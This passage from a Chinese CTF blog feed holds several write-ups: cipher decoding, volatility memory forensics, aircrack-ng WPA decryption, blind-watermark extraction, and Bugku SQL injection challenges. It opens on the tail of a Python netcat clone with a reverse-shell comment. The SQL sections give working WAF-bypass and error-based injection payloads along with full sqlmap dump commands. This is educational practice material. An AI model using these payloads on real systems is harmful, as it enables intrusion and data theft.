class="comment"># 放置一个反弹SHELL</span></span><br><span class="line">    <span class="comment"># 取决于上面的命令选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新疆首届知识技能大赛相关writeup</title>
      <link href="/2018/09/16/%E6%96%B0%E7%96%86%E9%A6%96%E5%B1%8A%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E7%9B%B8%E5%85%B3writeup/"/>
      <url>/2018/09/16/%E6%96%B0%E7%96%86%E9%A6%96%E5%B1%8A%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E7%9B%B8%E5%85%B3writeup/</url>
      
        <content type="html"><![CDATA[<p>一次CTF赛后总结<br><a id="more"></a><br>总是把比赛想的太简单，原来在哪里总是藏龙卧虎，不能小瞧任何人，也别高看了自己。但是这是第一次参加<strong>不让联网</strong>的CTF比赛！</p><blockquote><p>stay foolish,stay hungry</p></blockquote><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>通过这个题目，让我联想到与佛论禅和rot13加密，那么打开题目，下载下来一个docx文档。下面加粗的文字即是打开文档的内容。</p><p><strong>夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮</strong></p><p>首先我们打开<a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>，在其加密内容前加上<strong>佛曰：</strong>。如图所下：<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/1.png" alt="1.png"><br>下面是这个解出来密文，显然还有一层加密。<br><code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code><br>猜测<del>base64</del>编码，结果没有解出来。联系题目猜测为rot13加密<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/2.png" alt="2.png"><br>解码出来继续base64解码，在此之后我会写相关的加密的详解。<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/3.png" alt="3.png"></p><hr><h2 id="取证内存镜像flag"><a href="#取证内存镜像flag" class="headerlink" title="取证内存镜像flag"></a>取证内存镜像flag</h2><p>这道题给了hint才知道是内存取证，但是因为自己起初没在意相关工具的使用<del>其实就是自己懒</del>，那么这次的惨败正好弥补自己的不足。</p><p>volatility是专门进行内存取证的工具，对于windows系统比较友好，linux系统需要单独的安装相应的插件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-f  选择所要取证的镜像文件</span><br></pre></td></tr></table></figure></p><p>进行镜像识别<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imageinfo</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/4.jpg" alt="4.jpg"><br>我们可以发现volatility建议我们使用<strong>WinXPSP2x86</strong>，那么继续使用查看当时的dump下来的内存中存在的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--profile  使用哪一种镜像进行取证</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pslist  查看当时dump下来所运行的进程</span><br></pre></td></tr></table></figure><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/5.jpg" alt="5.jpg"><br>然而根据题目，我们猜测应该在是某个文件，那么扫描目录，其中为了查询相关字符，进行了管道命令以及<code>grep</code>进行筛选。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filescan  文件扫描</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/6.png" alt="6.png"><br>那么下面我就进行导出其相关文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpfiles 导出文件</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Q   所要导出文件的地址</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dump-dir  导出文件所要存在那个目录里</span><br></pre></td></tr></table></figure><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/7.png" alt="7.png"><br>打开发现这个压缩包需要密码，我猜测了许多种可能，密码应该在剪切板中，于是搜索剪切板的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clipboard    查看剪切板的内容</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/8.png" alt="8.png"><br>于是尝试是否这个剪切板的内容就是密码，获得flag<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/9.png" alt="9.png"></p><blockquote><p>这个是<strong>真·取证</strong>，让我感觉到这个CTF还是能够提高我在安全的其他方面的。</p></blockquote><hr><h2 id="流量包解密02"><a href="#流量包解密02" class="headerlink" title="流量包解密02"></a>流量包解密02</h2><p>&nbsp;&nbsp;果然还是见识少，所有的比赛的束手无措只是自己平时懒所付出的代价。<br>下载下来一看，文件是<code>.cap</code>结尾的格式，那么应该是WiFi所抓下来的包，而且题目提示密码就是本机的MAC地址。那么我们需要用到<strong>aircrack-ng</strong>工具解密流量。</p><p>先用wireshark打开流量包可以看到我们MAC地址（无线&gt;wlan流量）<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/10.png" alt="10.png"></p><p>aircrack-ng解密流量，有个坑<strong>密码MAC地址大写</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-w   使用密码字典</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/11.jpg" alt="11.jpg"><br>然后将key值导入进去(<strong>首选项&gt;protpcols&gt;IEEE 802.11&gt;Decryption key&gt;wpa-key</strong>)<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/12.png" alt="12.png"><br>然后追踪TCP流<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/13.png" alt="13.png"><br>最后查看网址找到了flag<br><img src="/2018/09/16/新疆首届知识技能大赛相关writeup/14.png" alt="14.png"></p><hr><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p><a href="https://blog.csdn.net/qq_28208251/article/details/48093575" target="_blank" rel="noopener">https://blog.csdn.net/qq_28208251/article/details/48093575</a><br><a href="https://xz.aliyun.com/t/1972" target="_blank" rel="noopener">https://xz.aliyun.com/t/1972</a><br><a href="http://netsecurity.51cto.com/art/201105/264844.htm" target="_blank" rel="noopener">http://netsecurity.51cto.com/art/201105/264844.htm</a><br><a href="https://blog.csdn.net/dmbjzhh/article/details/79425483" target="_blank" rel="noopener">https://blog.csdn.net/dmbjzhh/article/details/79425483</a></p><blockquote><p><strong>如果有同学需要上述题目，请联系我</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>照片里的盲水印</title>
      <link href="/2018/09/02/%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
      <url>/2018/09/02/%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
      
        <content type="html"><![CDATA[<p>很典型的CTF比赛题目<br><a id="more"></a><br>这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的<del>赛事水平</del>（赛棍？？？）<br><img src="/2018/09/02/照片里的盲水印/1.jpg" height="150px" width="150px"><br>但是这个方面还是要看一下，就当做开发脑力了。</p><p><strong>题目：暴力可解</strong><br><a href="https://pan.baidu.com/s/1GI9TlX3PtytDs0g6w-s3PQ" target="_blank" rel="noopener">题目文件</a><br>下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是<strong>纯数字类型</strong>。<br><img src="/2018/09/02/照片里的盲水印/2.jpg" alt="暴力破解"><br>获得密码，解压得到两张相同的图片。<br><img src="/2018/09/02/照片里的盲水印/3.png" alt="解压所得图片"><br>在misc中，两张相同的图片基本上都应该是<strong>盲水印</strong>，所以使用bwm脚本（python2）。bwm脚本的<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">github</a><br>运行脚本发现没有cv2这个模块，使用下面的命令安装cv2<br><code>pip install opencv-python</code><br>然后运行<code>python bwm.py decode 1.png 2.png flag.png</code>。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。<br><img src="/2018/09/02/照片里的盲水印/4.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 盲水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL报错注入</title>
      <link href="/2018/08/17/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/08/17/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>报错注入需要学习一下<br><a id="more"></a><br>快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。</p><p>这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。</p><p>题名：多次，<a href="http://120.24.86.145:9004/1ndex.php?id=1" target="_blank" rel="noopener">网址链接</a></p><p>首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤<strong>?id=1’</strong>，页面发生变化，猜测位查询语句为单引号闭合。<br><img src="/2018/08/17/SQL报错注入/1.png" alt=""><br>再次进行测试，<strong>?id=1′ or 1=1%23 </strong>，发现并无变化。<br><img src="/2018/08/17/SQL报错注入/2.png" alt=""><br>猜测可能有WAF过滤，于是测试双重写or，<strong>?id=1′ oorr 1=1%23</strong> ，测试发现页面改变<br><img src="/2018/08/17/SQL报错注入/3.png" alt=""></p><p>进行测试过滤，使用异或符号（^）搭配length函数开始测试。</p><p><em>如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。</em><br><img src="/2018/08/17/SQL报错注入/4.png" alt=""><br>经测试：or，and，union，select被过滤。那么接下来就是常规测试。</p><p><strong>?id=1%27 oorrder by 2%23</strong>，测试列数为2。（注意order里面的or）<br><img src="/2018/08/17/SQL报错注入/5.png" alt=""></p><h1 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：<strong>information里面的or</strong>）<br><img src="/2018/08/17/SQL报错注入/6.png" alt=""></p><h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23<br><img src="/2018/08/17/SQL报错注入/7.png" alt=""></p><h1 id="爆出数据"><a href="#爆出数据" class="headerlink" title="爆出数据"></a>爆出数据</h1><p>?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23<br><img src="/2018/08/17/SQL报错注入/8.png" alt=""><br>然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。</p><h1 id="寻找下一关地址"><a href="#寻找下一关地址" class="headerlink" title="寻找下一关地址"></a>寻找下一关地址</h1><p>?id=-1%27 uniounionn selecselectt 1,address from flag1 %23<br><img src="/2018/08/17/SQL报错注入/9.png" alt=""></p><h2 id="找到下一关地址"><a href="#找到下一关地址" class="headerlink" title="找到下一关地址"></a>找到下一关地址</h2><p><img src="/2018/08/17/SQL报错注入/10.png" alt=""><br>OK，还是向上面的一样测试，发现还是单引号过滤。<br><img src="/2018/08/17/SQL报错注入/11.png" alt=""><br>发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union<br><img src="/2018/08/17/SQL报错注入/12.png" alt=""><br>那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。<br><img src="/2018/08/17/SQL报错注入/13.PNG" alt=""><br>因为还发现有报错产生，那么我就进行报错盲注测试。</p><p>盲注测试公式：<strong>union select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</strong></p><p>其中<strong>version()</strong>改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。</p><p> <em>or (select 1 from(select count(</em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)<em>2))x from information_schema.schemata group by x)a)%23</em></p><p>因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错<strong>Operand should contain 1 column(s) </strong>, 且(select count(<em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)</em>2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。<br><img src="/2018/08/17/SQL报错注入/14.png" alt=""><br>但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。<br><img src="/2018/08/17/SQL报错注入/15.png" alt=""><br>解决方法：left((select flag2 from flag2),40)，取前40个字符。<br><img src="/2018/08/17/SQL报错注入/16.png" alt=""></p><h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><p><a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80455884</a></p><p><a href="http://wyb0.com/" target="_blank" rel="noopener">http://wyb0.com/</a></p><blockquote><p><strong>两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLinjection </tag>
            
            <tag> 手动注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMAP-POST注入</title>
      <link href="/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>POST注入+SQLMAP<br><a id="more"></a><br>BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。</p><p><center><strong>抓包，复制出来打成一个txt文件</strong></center><br><img src="/2018/08/17/SQLMAP-POST注入/1.png" alt="抓包内容"></p><p><center><strong>sqlmap -r test.txt -p admin_name –dbs</strong></center><br>因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。<br><img src="/2018/08/17/SQLMAP-POST注入/2.png" alt=""></p><ul><li><p>-r  指定一个文件。</p></li><li><p>-p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。</p></li><li><p>–dbs 爆出所有的数据库。</p></li></ul><p>点击回车运行，竟然发现无法进行sql注入！</p><p><img src="/2018/08/17/SQLMAP-POST注入/3.png" alt=""><br>上图是我进行注入失败，后面继续追加了下面的参数</p><ul><li><p>-v  这个是展现攻击测试的详细过程的程度，一般设为3就足够。</p></li><li><p>–threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。</p></li></ul><center><strong>sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3</strong></center><p><img src="/2018/08/17/SQLMAP-POST注入/4.PNG" alt=""><br>如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。</p><p>解释参数：</p><ul><li>–level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。<br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –table</strong></center><br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump</strong></center><br>这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。</li></ul><p>解释参数：</p><ul><li><p>-D 指定数据库。</p></li><li><p>-T  指定表。</p></li><li><p>–table  数据库爆表名。</p></li><li><p>–dump 显示所有字段。</p></li></ul><hr><p><a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">题目地址</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> SQLinjection </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
